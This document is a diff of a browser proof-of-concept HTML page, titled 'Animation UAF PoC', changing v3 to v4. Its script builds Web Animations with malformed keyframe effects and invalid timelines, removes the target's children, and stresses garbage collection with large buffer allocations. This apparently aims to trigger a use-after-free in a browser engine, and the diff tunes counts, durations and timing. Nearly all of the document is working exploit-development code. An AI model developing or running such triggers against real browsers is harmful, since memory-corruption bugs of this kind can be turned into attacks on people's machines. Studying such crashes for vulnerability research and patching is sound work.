@@ -2,16 +2,16 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Animation UAF PoC v3</title>
+    <title>Animation UAF PoC v4</title>
 </head>
 <body>
     <div id="target"></div>
     <script>
         function stressGC() {
-            for (let i = 0; i < 1500; i++) {
+            for (let i = 0; i < 1000; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
-            for (let i = 0; i < 200; i++) {
+            for (let i = 0; i < 150; i++) {
                 new ArrayBuffer(2 * 1024 * 1024);
             }
         }
@@ -24,10 +24,15 @@
             const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
             animations.push(new Animation(effect, document.timeline));
         }
-        // Add invalid effect
+        // Add invalid effect 1
         try {
             const invalidEffect = new KeyframeEffect(target, null, { duration: 0 });
             animations.push(new Animation(invalidEffect, document.timeline));
+        } catch (e) {}
+        // Add invalid effect 2
+        try {
+            const invalidEffect2 = new KeyframeEffect(target, keyframes, { duration: NaN });
+            animations.push(new Animation(invalidEffect2, document.timeline));
         } catch (e) {}
         // Add invalid timeline
         try {
@@ -44,7 +49,7 @@
             });
             target.replaceChildren('test');
             stressGC();
-        }, 2);
+        }, 1);
     </script>
 </body>
 </html>
